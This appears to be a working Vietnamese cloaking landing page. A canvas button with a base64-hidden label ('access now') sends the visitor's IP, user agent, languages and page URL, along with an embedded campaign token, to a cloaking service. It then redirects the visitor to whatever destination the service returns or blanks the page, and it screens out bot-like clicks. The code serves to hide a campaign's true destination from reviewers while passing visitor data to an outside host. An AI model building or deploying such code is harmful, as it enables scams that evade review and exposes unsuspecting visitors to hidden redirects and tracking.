<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Redirect Button</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #000;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
  </style>
</head>
<body>

<div style="display: flex; justify-content: center; width: 100%; padding: 10px 0; background: #000;">
  <canvas id="appCanvas" width="380" height="80" style="width: 100%; max-width: 380px; height: auto; border-radius: 40px; cursor: pointer; box-shadow: 0 6px 15px rgba(230, 35, 35, 0.4); -webkit-tap-highlight-color: transparent;"></canvas>
</div>

<script>
(function() {
  const canvas = document.getElementById('appCanvas');
  const ctx = canvas.getContext('2d');

  const redGrad = ctx.createLinearGradient(0, 10, 0, 70);
  redGrad.addColorStop(0, '#e62323');
  redGrad.addColorStop(1, '#990000');

  ctx.fillStyle = redGrad;
  ctx.beginPath();
  if (typeof ctx.roundRect === 'function') {
    ctx.roundRect(10, 10, 360, 60, 30);
  } else {
    ctx.rect(10, 10, 360, 60);
  }
  ctx.fill();

  const btnTextEncoded = "VFJVWSBD4bq6UCBOR0FZ";

  function decodeBase64Utf8(str) {
    const binary = atob(str);
    const bytes = Uint8Array.from(binary, char => char.charCodeAt(0));
    return new TextDecoder().decode(bytes);
  }

  const btnText = decodeBase64Utf8(btnTextEncoded);

  ctx.fillStyle = "#ffffff";
  ctx.font = "900 18px -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif";
  ctx.textAlign = "center";
  ctx.textBaseline = "middle";
  ctx.fillText(btnText, 190, 40);

  let isReady = false;
  setTimeout(function() { isReady = true; }, 1200);

  async function checkAndRedirect() {
    try {
      // Thiết lập Referrer Policy
      let metaTag = document.querySelector('meta[name="referrer"]');
      if (!metaTag) {
        metaTag = document.createElement('meta');
        metaTag.name = 'referrer';
        document.head.appendChild(metaTag);
      }
      metaTag.content = 'origin';

      let clientIP = '';
      try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 1500);

        const ipResponse = await fetch('https://api.ipify.org?format=json', { 
          signal: controller.signal 
        });
        clearTimeout(timeoutId);

        if (ipResponse.ok) {
          const ipData = await ipResponse.json();
          clientIP = ipData.ip || '';
        }
      } catch (ipError) {
        console.warn('IP fetch bypassed or timed out:', ipError);
      }

      const params = {
        campaign_id: '463',
        client_token: '221555331:rebahrwBCUvRuf5QNEnnAqMhIxF3FfDGEicCJ2LkxmBHjNUMA4eVoO84PvYwYqjQ',
        ip: clientIP,
        user_agent: navigator.userAgent,
        accept_language: navigator.languages ? navigator.languages.join(',') : navigator.language,
        current_url: window.location.href,
        max_touch_points: String(navigator.maxTouchPoints || 0),
      };

      const response = await fetch('https://api.cloakerly.com/v8/?' + new URLSearchParams(params).toString());
      const data = (await response.text()).trim();

      if (data.startsWith('http')) {
        window.location.href = data;
      } else if (data === 'true') {
        console.log('Traffic allowed');
      } else {
        window.location.href = 'about:blank';
      }
    } catch (error) {
      console.error('cloakerly API error:', error);
    }
  }

  canvas.addEventListener('click', function(e) {
    if (!isReady) return;
    if (e.isTrusted === false || (e.clientX === 0 && e.clientY === 0)) return;

    const rect = canvas.getBoundingClientRect();
    const scaleY = canvas.height / rect.height;
    const clickY = (e.clientY - rect.top) * scaleY;

    if (clickY >= 10 && clickY <= 70) {
      checkAndRedirect();
    }
  });
})();
</script>

</body>
</html>
